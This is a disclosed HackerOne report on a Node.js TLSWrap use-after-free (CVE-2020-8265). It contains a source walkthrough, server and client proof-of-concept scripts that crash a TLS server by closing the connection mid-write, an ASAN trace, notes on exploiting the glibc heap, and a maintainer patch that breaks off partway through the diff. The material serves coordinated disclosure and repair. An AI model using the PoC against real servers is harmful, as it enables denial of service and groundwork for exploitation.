{"id":988103,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODgxMDM=","url":"https://hackerone.com/reports/988103","title":"Node.js: use-after-free in TLSWrap","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-09-22T12:49:41.090Z","submitted_at":"2020-09-22T12:49:41.135Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fwilhelm","url":"/fwilhelm","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22984,"url":"https://hackerone.com/nodejs","handle":"nodejs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Node.js","twitter_handle":"nodejs","website":"https://nodejs.org","about":"The Node.js JavaScript Runtime"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8265"],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-05T08:18:06.740Z","bug_reporter_agreed_on_going_public_at":"2021-01-05T08:18:06.666Z","team_member_agreed_on_going_public_at":"2021-01-04T19:53:32.902Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Node.js: use-after-free in TLSWrap\n\nNode v14.11.0 (Current) is vulnerable to a use-after-free bug in its TLS implementation.\nWhen writing to a TLS enabled socket, node::StreamBase::Write calls node::TLSWrap::DoWrite\nwith a freshly allocated WriteWrap object as first argument. If the DoWrite method\ndoes not return an error, this object is passed back to the caller as part of a \nStreamWriteResult structure:\n  // stream_base-inl.h\n  WriteWrap* req_wrap = CreateWriteWrap(req_wrap_obj);\n\n  err = DoWrite(req_wrap, bufs, count, send_handle);\n  bool async = err == 0;\n\n  if (!async) {\n    req_wrap-\u003eDispose();\n    req_wrap = nullptr;\n  }\n\n  const char* msg = Error();\n  if (msg != nullptr) {\n    req_wrap_obj-\u003eSet(env-\u003econtext(),\n                      env-\u003eerror_string(),\n                      OneByteString(env-\u003eisolate(), msg)).Check();\n    ClearError();\n  }\n\n  return StreamWriteResult { async, err, req_wrap, total_bytes };\n\nThe problem is that TLSWrap::DoWrite can trigger a free of the WriteWrap object \nwithout returning an error when the EncOut() call at the end of the DoWrite method fails.\nEncOut() calls underlying_stream()-\u003eWrite() to write TLS encrypted data to the network socket.\nIf this write fails, InvokeQueued() is called and the function returns immediately:\n\n  // tls_wrap.cc\n  // Write any encrypted/handshake output that may be ready.\n  // Guard against sync call of current_write_-\u003eDone(), its unsupported.\n  in_dowrite_ = true;\n  EncOut();\n  in_dowrite_ = false;\n\n  return 0;\n\n  // tls_wrap.cc\n  void TLSWrap::EncOut() {\n  [...]\n\n  Debug(this, \"Writing %zu buffers to the underlying stream\", count);\n  StreamWriteResult res = underlying_stream()-\u003eWrite(bufs, count);\n  if (res.err != 0) {\n    InvokeQueued(res.err);\n    return;\n  }\n  [..]\n\nInvokeQueued() triggers an immediate free of the req_wrap WriteWrap* object via the\nfollowing call chain: \nnode::TLSWrap::InvokeQueued -\u003e node::StreamReq::Done -\u003e node::WriteWrap::OnDone\n-\u003e node::StreamReq::Dispose -\u003e node::BaseObjectPtrImpl\u003cnode::AsyncWrap, false\u003e::~BaseObjectPtrImpl()\n-\u003e node::BaseObject::decrease_refcount() -\u003e node::SimpleWriteWrap\u003cnode::AsyncWrap\u003e::~SimpleWriteWrap()\n\nMaking underlying_stream()-\u003eWrite fail is as easy as closing the socket at the other side \nof the connection just before the write to trigger a broken pipe error. \n\nBecause node::TLSWrap::DoWrite doesn't return an error code, node::StreamBase::Write will return \nthe freed WriteWrap object as part of its StreamWriteResult. For calls by node::StreamBase::WriteV, \nthis will immediately trigger a use-after-free when the SetAllocatedStorage() method \nis called on the freed object:\n\n  // stream_base.cc\n  StreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);\n  SetWriteResult(res);\n  if (res.wrap != nullptr \u0026\u0026 storage_size \u003e 0) {\n    res.wrap-\u003eSetAllocatedStorage(std::move(storage));\n  }\n\nThe bug can be easily triggered against a simple node HTTPS server application. Under normal \ncircumstances and without an ASAN enabled build, the UAF doesn't trigger a crash on Linux \nas the freed memory  won't get reallocated in time and the write in SetAllocatedStorage \ncorrupts chunk metadata  that isn't used for small chunks. \nI think this is the only reason why the bug wasn't spotted earlier, as the broken pipe error path should be hit \npretty often in the real world. However, this issue might still be exploitable with the right heap layout \n(if the WriteWrap chunk is merged with a larger chunk during the free), different heap implementations \nand/or some other control flow that allows to allocate something before the reuse. \n\nProof-of-Concept:\n\nserver.js:\n```\nconst https = require('https');\n\nconst key = `-----BEGIN EC PARAMETERS-----\nBggqhkjOPQMBBw==\n-----END EC PARAMETERS-----\n-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIDKfHHbiJMdu2STyHL11fWC7psMY19/gUNpsUpkwgGACoAoGCCqGSM49\nAwEHoUQDQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81\nPWBiTdSZrGBGQSy+UAlQvYeE6Z/QXQk8aw==\n-----END EC PRIVATE KEY-----`\n\nconst cert = `-----BEGIN CERTIFICATE-----\nMIIBhjCCASsCFDJU1tCo88NYU//pE+DQKO9hUDsFMAoGCCqGSM49BAMCMEUxCzAJ\nBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5l\ndCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwOTIyMDg1NDU5WhcNNDgwMjA3MDg1NDU5\nWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwY\nSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcD\nQgAEItqm+pYj3Ca8bi5mBs+H8xSMxuW2JNn4I+kw3aREsetLk8pn3o81PWBiTdSZ\nrGBGQSy+UAlQvYeE6Z/QXQk8azAKBggqhkjOPQQDAgNJADBGAiEA7Bdn4F87KqIe\nY/ABy/XIXXpFUb2nyv3zV7POQi2lPcECIQC3UWLmfiedpiIKsf9YRIyO0uEood7+\nglj2R1NNr1X68w==\n-----END CERTIFICATE-----`\n\nconst options = {\n  key: key,\n  cert: cert,\n};\n\nhttps.createServer(options, function (req, res) {\n  res.writeHead(200);\n  res.end(\"hello world\\n\");\n}).listen(4444);\n```\n---\n\npoc.js:\n```\nconst tls = require('tls')\n\nvar socket = tls.connect(4444, 'localhost', {rejectUnauthorized : false}, () =\u003e {\n  console.log(\"connected\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n  socket.write(\"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nConnection: Keep-alive\\r\\n\\r\\n\")\n})\n\n\nsocket.on('data', () =\u003e {\n  socket.destroy()\n})  \n```\n\n\n\n\n\nThe POC triggers a crash when server.js is run on an ASAN enabled build of node.js: \n```\n==1408671==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000011138 at pc 0x0000011929b6 bp 0x7ffc8c2243f0 sp 0x7ffc8c2243e8\nREAD of size 8 at 0x608000011138 thread T0\n    #0 0x11929b5 in std::__uniq_ptr_impl\u003cv8::BackingStore, std::default_delete\u003cv8::BackingStore\u003e \u003e::_M_ptr() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42\n    #1 0x1192974 in std::unique_ptr\u003cv8::BackingStore, std::default_delete\u003cv8::BackingStore\u003e \u003e::get() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:361:21\n    #2 0x1193fb4 in std::unique_ptr\u003cv8::BackingStore, std::default_delete\u003cv8::BackingStore\u003e \u003e::operator bool() const /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:375:16\n    #3 0x1190415 in node::AllocatedBuffer::data() /pwd/out/../src/allocated_buffer-inl.h:79:8\n    #4 0x16f8a79 in node::WriteWrap::SetAllocatedStorage(node::AllocatedBuffer\u0026\u0026) /pwd/out/../src/stream_base-inl.h:247:3\n    #5 0x16f1141 in node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:172:15\n    #6 0x16faa47 in void node::StreamBase::JSMethod\u003c\u0026(node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026))\u003e(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:468:29\n    #7 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #8 0x1cabfaf in v8::internal::MaybeHandle\u003cv8::internal::Object\u003e v8::internal::(anonymous namespace)::HandleApiCallHelper\u003cfalse\u003e(v8::internal::Isolate*, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::FunctionTemplateInfo\u003e, v8::internal::Handle\u003cv8::internal::Object\u003e, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #9 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #10 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #11 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n\n0x608000011138 is located 24 bytes inside of 88-byte region [0x608000011120,0x608000011178)\nfreed by thread T0 here:\n    #0 0xe79b1d in operator delete(void*) (/p0/node/node-v14.11.0/out/Debug/node+0xe79b1d)\n    #1 0x1707177 in node::SimpleWriteWrap\u003cnode::AsyncWrap\u003e::~SimpleWriteWrap() /pwd/out/../src/stream_base.h:418:7\n    #2 0xf943be in node::BaseObject::decrease_refcount() /pwd/out/../src/base_object-inl.h:203:7\n    #3 0x10886e6 in node::BaseObjectPtrImpl\u003cnode::AsyncWrap, false\u003e::~BaseObjectPtrImpl() /pwd/out/../src/base_object-inl.h:248:12\n    #4 0x13c2a3c in node::StreamReq::Dispose() /pwd/out/../src/stream_base-inl.h:40:1\n    #5 0x16f794c in node::WriteWrap::OnDone(int) /pwd/out/../src/stream_base.cc:591:3\n    #6 0x10e71f8 in node::StreamReq::Done(int, char const*) /pwd/out/../src/stream_base-inl.h:261:3\n    #7 0x1921f95 in node::TLSWrap::InvokeQueued(int, char const*) /pwd/out/../src/tls_wrap.cc:101:8\n    #8 0x1927f39 in node::TLSWrap::EncOut() /pwd/out/../src/tls_wrap.cc:356:5\n    #9 0x192e258 in node::TLSWrap::DoWrite(node::WriteWrap*, uv_buf_t*, unsigned long, uv_stream_s*) /pwd/out/../src/tls_wrap.cc:820:3\n    #10 0x13b50dd in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local\u003cv8::Object\u003e) /pwd/out/../src/stream_base-inl.h:193:9\n    #11 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:169:27\n    #12 0x16faa47 in void node::StreamBase::JSMethod\u003c\u0026(node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026))\u003e(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:468:29\n    #13 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #14 0x1cabfaf in v8::internal::MaybeHandle\u003cv8::internal::Object\u003e v8::internal::(anonymous namespace)::HandleApiCallHelper\u003cfalse\u003e(v8::internal::Isolate*, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::FunctionTemplateInfo\u003e, v8::internal::Handle\u003cv8::internal::Object\u003e, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #15 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #16 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #17 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n \npreviously allocated by thread T0 here:\n    #0 0xe792bd in operator new(unsigned long) (/p0/node/node-v14.11.0/out/Debug/node+0xe792bd)\n    #1 0x16f81c2 in node::StreamBase::CreateWriteWrap(v8::Local\u003cv8::Object\u003e) /pwd/out/../src/stream_base.cc:629:10\n    #2 0x13b4fb0 in node::StreamBase::Write(uv_buf_t*, unsigned long, uv_stream_s*, v8::Local\u003cv8::Object\u003e) /pwd/out/../src/stream_base-inl.h:191:25\n    #3 0x16f108f in node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:169:27\n    #4 0x16faa47 in void node::StreamBase::JSMethod\u003c\u0026(node::StreamBase::Writev(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026))\u003e(v8::FunctionCallbackInfo\u003cv8::Value\u003e const\u0026) /pwd/out/../src/stream_base.cc:468:29\n    #5 0x1caf642 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo) /pwd/out/../deps/v8/src/api/api-arguments-inl.h:158:3\n    #6 0x1cabfaf in v8::internal::MaybeHandle\u003cv8::internal::Object\u003e v8::internal::(anonymous namespace)::HandleApiCallHelper\u003cfalse\u003e(v8::internal::Isolate*, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::HeapObject\u003e, v8::internal::Handle\u003cv8::internal::FunctionTemplateInfo\u003e, v8::internal::Handle\u003cv8::internal::Object\u003e, v8::internal::BuiltinArguments) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:111:36\n    #7 0x1ca8f8a in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:141:5\n    #8 0x1ca81e0 in v8::internal::Builtin_HandleApiCall(int, unsigned long*, v8::internal::Isolate*) /pwd/out/../deps/v8/src/builtins/builtins-api.cc:129:1\n    #9 0x3e096df in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit (/p0/node/node-v14.11.0/out/Debug/node+0x3e096df)\n    #10 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n    #11 0x3c06181 in Builtins_InterpreterEntryTrampoline (/p0/node/node-v14.11.0/out/Debug/node+0x3c06181)\n   \n\nSUMMARY: AddressSanitizer: heap-use-after-free /usr/bin/../lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/unique_ptr.h:154:42 in std::__uniq_ptr_impl\u003cv8::BackingStore, std::default_delete\u003cv8::BackingStore\u003e \u003e::_M_ptr() const\nShadow bytes around the buggy address:\n  0x0c107fffa1d0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa1e0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa1f0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa200: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa\n  0x0c107fffa210: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n=\u003e0x0c107fffa220: fa fa fa fa fd fd fd[fd]fd fd fd fd fd fd fd fa\n  0x0c107fffa230: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa240: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa250: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa260: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c107fffa270: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n  Shadow gap:              cc\n==1408671==ABORTING\n```\n\nCredits: \nFelix Wilhelm of Google Project Zero\n\nThis bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report \nwill become visible to the public. The scheduled disclosure date is 2020-12-21. \nDisclosure at an earlier date is also possible if agreed upon by all parties.\n\n## Impact\n\nRemote code execution","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":50,"name":"Use After Free"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-02-03T19:53:33.034Z","allow_singular_disclosure_after":-21585306.038180403,"singular_disclosure_allowed":true,"vote_count":26,"voters":["p0wn4j","th4nu_0x0","demonia","salahhasoneh","hexagr","hakivvi","mrmatt","grimlyreaper","floki0400","eitans","and 16 more..."],"severity":{"rating":"high","score":7.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9289557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this Felix, it's really a nasty bug. Could you please articulate how this could be exploited in practice? You mention that the impact is Remote Code Execution, but there is no PoC for it. Given your extensive research, have you got a potential fix?\n\nIf this is theoretical, we might want to fix this in the public tracker as we have just issued a security release and this would have to wait for a few months before we ship a new one.\n\nHave you verified this to be present only in v14 or also in 12? ","automated_response":false,"created_at":"2020-09-22T13:17:36.841Z","updated_at":"2020-09-22T13:17:36.841Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9289562,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2020-09-22T13:17:52.538Z","updated_at":"2020-09-22T13:17:52.538Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9295566,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi Matteo, \n\nIt's a somewhat limited memory corruption so it's difficult to make any definite statements about exploitability. And any assessment would only apply to a single version-OS combination (and even be application specific). With this in mind and based on my very rough initial analysis, an RCE exploit against a Linux system using glibc  seems difficult, but not impossible: \n\nIn the flow that my POC triggers, there are no allocation between free and use so an attacker can't corrupt a newly allocated object. SetAllocatedStorage() will write a pointer into offset 0x10 which isn't used for small free memory regions. This leads to the masking of the bug under normal circumstances.  However, there is another call to free() that can trigger merging of chunks through an internal glibc function (malloc_consolidate). If the chunk of the WriteWrap object gets merged with a larger one, the UAF ends up corrupting glibc heap metadata (fd_nextsize) with a valid pointer. This is at least a Denial-of-Service, but can potentially be turned into a full RCE exploit. \nThe situation might be completely different for other version or operating systems. Small changes to the WriteWrap class layout or the Stream methods could make RCE easier or impossible. \nFWIW I quickly tested this on my OS X laptop and the proof of concept triggers a crash against a non-ASAN node install. So on OS X this is a trivial DoS.\n\nI would **not** recommend to fix this in the public tracker without a security release before spending significant more effort on analysing exploitability. \n\nRe Fix: My gut feeling would be that EncOut() in TLSWrap would need to report the sigpipe error back to its callers. But the whole stream handling code seems awfully complex so I'm not confident that I can contribute a correct patch for this. Sorry.\n\n| Have you verified this to be present only in v14 or also in 12?\nI just tried the POC against node-v12.18.4 and it is also affected. \n\n\n","automated_response":false,"created_at":"2020-09-22T16:20:59.583Z","updated_at":"2020-09-22T16:20:59.583Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9302647,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Agreed, this must be fixed privately. Thanks for the detailed answer.","automated_response":false,"created_at":"2020-09-23T07:43:32.019Z","updated_at":"2020-09-23T07:43:32.019Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9376929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I had suspected this may have been a possibility before but had not investigated further. I will take a look at preparing a fix for all release lines. Realistically it will be early next week before I can take a look","automated_response":false,"created_at":"2020-09-30T16:37:37.341Z","updated_at":"2020-09-30T16:37:37.341Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9453716,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm working on the fix for this for the main branch. Once I have the primary fix done, I'll work on backports","automated_response":false,"created_at":"2020-10-08T00:12:38.945Z","updated_at":"2020-10-08T00:12:38.945Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9453732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FWIW, the challenge here is really with StreamBase and the way WriteWrap instances are handled in general. That is, this is not specific to TLSWrap, that just happens to be the place where the bug manifests. That's a long way of saying that fixing this properly will end up touching on a few more things than just TLSWrap.","automated_response":false,"created_at":"2020-10-08T00:24:58.016Z","updated_at":"2020-10-08T00:24:58.016Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9481614,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@fwilhelm ... while investigating this further, there was another change on the main node.js repo that may have fixed this -- at least, I'm not able to recreate the failure now. It would be excellent if you could give your test a try again rebasing from the master branch to see if the issue persists","automated_response":false,"created_at":"2020-10-10T14:57:10.720Z","updated_at":"2020-10-10T14:57:10.720Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9490160,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jasnell \nThanks for looking into this. \nI can still trigger the crash on the current master branch:\n```\n[fwilhelm@fwilhelm node]$ git log\ncommit 2d83e743d934738a3ad26ed587eb7cfd6ca46081 (HEAD -\u003e master, origin/master, origin/HEAD)\nAuthor: Colin Ihrig \u003ccjihrig@gmail.com\u003e\nDate:   Fri Oct 9 16:48:11 2020 -0400\n```\nbuilt with `./configure --debug --enable-asan \u0026\u0026 make -j4`","automated_response":false,"created_at":"2020-10-12T08:15:46.179Z","updated_at":"2020-10-12T08:15:46.179Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9496304,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, I was afraid of that. I'll have a patch with a quick fix shortly for you to test","automated_response":false,"created_at":"2020-10-12T15:52:52.205Z","updated_at":"2020-10-12T15:52:52.205Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9500923,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok, please give the following patch a try to see if it resolves the issue. It appears to fix it on my end using valgrind to test.\n\n```diff\nFrom 7b935231653f64c2f5eca8dd42e75b8c336aebca Mon Sep 17 00:00:00 2001\nFrom: James M Snell \u003cjasnell@gmail.com\u003e\nDate: Mon, 12 Oct 2020 17:26:44 -0700\nSubject: [PATCH] src: fixup use-after-free in TLSWrap\n\nSigned-off-by: James M Snell \u003cjasnell@gmail.com\u003e\n---\n src/stream_base.cc |  2 +-\n src/tls_wrap.cc    | 26 ++++++++++++++++----------\n src/tls_wrap.h     |  2 +-\n 3 files changed, 18 insertions(+), 12 deletions(-)\n\ndiff --git a/src/stream_base.cc b/src/stream_base.cc\nindex 3ad2017460..795873c530 100644\n--- a/src/stream_base.cc\n+++ b/src/stream_base.cc\n@@ -168,7 +168,7 @@ int StreamBase::Writev(const FunctionCallbackInfo\u003cValue\u003e\u0026 args) {\n\n   StreamWriteResult res = Write(*bufs, count, nullptr, req_wrap_obj);\n   SetWriteResult(res);\n-  if (res.wrap != nullptr \u0026\u0026 storage_size \u003e 0) {\n+  if (res.err == 0 \u0026\u0026 res.wrap != nullptr \u0026\u0026 storage_size \u003e 0) {\n     res.wrap-\u003eSetAllocatedStorage(std::move(storage));\n   }\n   return res.err;\ndiff --git a/src/tls_wrap.cc b/src/tls_wrap.cc\nindex 908e3899db..13d47d8035 100644\n--- a/src/tls_wrap.cc\n+++ b/src/tls_wrap.cc\n@@ -280,25 +280,25 @@ void TLSWrap::SSLInfoCallback(const SSL* ssl_, int where, int ret) {\n }\n\n\n-void 